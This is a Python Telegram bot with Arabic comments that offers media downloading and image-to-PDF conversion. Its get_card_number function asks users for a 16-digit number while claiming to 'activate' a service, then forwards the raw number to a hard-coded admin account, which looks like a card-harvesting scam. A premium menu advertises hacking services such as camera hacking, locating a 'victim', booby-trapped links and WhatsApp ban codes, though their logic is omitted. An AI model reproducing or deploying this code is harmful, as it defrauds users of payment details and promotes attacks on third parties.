import os
import telebot
import logging
import time
import threading
import requests
import io
import instaloader
from flask import Flask
from threading import Thread
from telebot import types
from PIL import Image
from rembg import remove

# --- إعدادات الاحترافية ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
TOKEN = os.environ.get('TOKEN')
ADMIN_ID = os.environ.get('ADMIN_ID', '438077185')
bot = telebot.TeleBot(TOKEN)

# تهيئة انستالودر
L = instaloader.Instaloader(download_videos=True, download_pictures=True, save_metadata=False)

# نظام حماية من الضغط (Rate Limiting)
user_last_call = {}
def is_spaming(user_id):
    last_time = user_last_call.get(user_id, 0)
    if time.time() - last_time < 2: return True
    user_last_call[user_id] = time.time()
    return False

# --- دالة التحميل الشاملة (API) - الحل الجذري للحظر ---
def process_universal_video(message):
    if is_spaming(message.chat.id): return
    url = message.text.strip()
    
    # حماية: فلترة الروابط
    if not any(d in url for d in ['instagram.com', 'facebook.com', 'youtube.com', 'youtu.be', 'tiktok.com']):
        bot.send_message(message.chat.id, "⚠️ رابط غير مدعوم أو غير آمن.")
        return

    wait_msg = bot.send_message(message.chat.id, "⏳ جاري المعالجة والتحميل عبر خوادم ماكس...")
    
    def worker():
        try:
            api_url = "https://api.cobalt.tools/api/json"
            payload = {"url": url, "vCodec": "h264"}
            headers = {"Accept": "application/json", "Content-Type": "application/json"}
            response = requests.post(api_url, json=payload, headers=headers).json()
            
            if response.get("status") == "success":
                bot.send_video(message.chat.id, response.get("url"), caption="✅ تم التحميل بنجاح بواسطة ✨ 𝓜𝓐𝓧 𝓑𝓞𝓞𝓣 ✨")
            else:
                bot.send_message(message.chat.id, "⚠️ فشل التحميل: تأكد أن الحساب عام.")
        except Exception as e:
            logging.error(f"Error in video_link: {e}")
            bot.send_message(message.chat.id, "⚠️ حدث خطأ تقني.")
        finally:
            try: bot.delete_message(message.chat.id, wait_msg.message_id)
            except: pass

    threading.Thread(target=worker).start()

# --- دالة تحميل الستوري (محدثة) ---
def process_insta_username(message):
    if is_spaming(message.chat.id): return
    username = message.text.replace('@', '').strip()
    wait_msg = bot.send_message(message.chat.id, f"🔍 جاري البحث عن ستوري {username}...")
    
    def worker():
        try:
            profile = instaloader.Profile.from_username(L.context, username)
            stories = L.get_stories(userids=[profile.userid])
            count = 0
            for story in stories:
                for item in story.get_items():
                    count += 1
                    if item.is_video: bot.send_video(message.chat.id, item.video_url)
                    else: bot.send_photo(message.chat.id, item.url)
            if count == 0: bot.send_message(message.chat.id, "لم يتم العثور على أي ستوري.")
        except Exception as e:
            logging.error(f"Insta Error: {e}")
            bot.send_message(message.chat.id, "⚠️ خطأ: تأكد أن الحساب عام.")
        finally:
            try: bot.delete_message(message.chat.id, wait_msg.message_id)
            except: pass
    threading.Thread(target=worker).start()

# --- بقية الدوال (بدون تغيير في المنطق، فقط تحسين) ---
def process_to_pdf(message):
    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        image = Image.open(io.BytesIO(bot.download_file(file_info.file_path)))
        pdf_buffer = io.BytesIO()
        image.save(pdf_buffer, "PDF", resolution=100.0)
        bot.send_document(message.chat.id, pdf_buffer.getvalue(), visible_file_name="image.pdf")
    except Exception as e:
        bot.send_message(message.chat.id, f"⚠️ خطأ: {e}")

def get_card_number(message, provider):
    if message.text.isdigit() and len(message.text) == 16:
        bot.reply_to(message, "جاري التفعيل.. انتظر قليلاً.")
        try: bot.send_message(ADMIN_ID, f"طلب جديد:\nالمزود: {provider}\nالرقم: {message.text}")
        except: pass
    else:
        msg = bot.reply_to(message, "خطأ: يرجى إرسال 16 رقماً فقط.")
        bot.register_next_step_handler(msg, lambda m: get_card_number(m, provider))

# --- الكود الأساسي للربط (Callback Query) ---
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == 'free_sub':
        buttons = [types.InlineKeyboardButton(name, callback_data=f'f{i+1}') for i, name in enumerate(["تحميل ستوري", "تحميل فيديو🎥", "تحويل صوت🔊", "تحويل PDF📄"])]
        markup = types.InlineKeyboardMarkup(row_width=2).add(*buttons)
        bot.edit_message_text("اختر الخدمة المجانية:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    elif call.data == 'f1':
        msg = bot.send_message(call.message.chat.id, "أرسل يوزر الحساب:")
        bot.register_next_step_handler(msg, process_insta_username)
    elif call.data == 'f2':
        msg = bot.send_message(call.message.chat.id, "أرسل الرابط:")
        bot.register_next_step_handler(msg, process_universal_video)
    elif call.data == 'f4':
        msg = bot.send_message(call.message.chat.id, "أرسل الصورة لتحويلها PDF:")
        bot.register_next_step_handler(msg, process_to_pdf)
    
    # قسم ماكس (كما طلبته)
    elif call.data == 'max_sub':
        my_names = ["💀واتساب", "يوزرات تلي", "كود حظر واتس", "اختراق كاميرا", "موقع الضحية", "دعس تيكتوك", "أرقام فيك", "فتح انستا", "فك حظر سافيوم", "كود حظر", "مزايا انستا", "تلغيم رابط", "ببجي", "رشق انستا", "تفعيل برو", "بلياردو", "تيكتوك ترول", "ازالة اعلانات", "ارقام حقيقية", "تطبيقات برو"]
        markup = types.InlineKeyboardMarkup(row_width=2).add(*[types.InlineKeyboardButton(my_names[i], callback_data=f'max_{i+1}') for i in range(20)])
        bot.edit_message_text("خدمات ماكس:", call.message.chat.id, call.message.message_id, reply_markup=markup)

    # ... (بقية منطق الماكس) ...

# --- التشغيل ---
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    Thread(target=lambda: Flask('').run(host='0.0.0.0', port=port)).start()
    logging.info("Bot is running...")
    bot.infinity_polling()
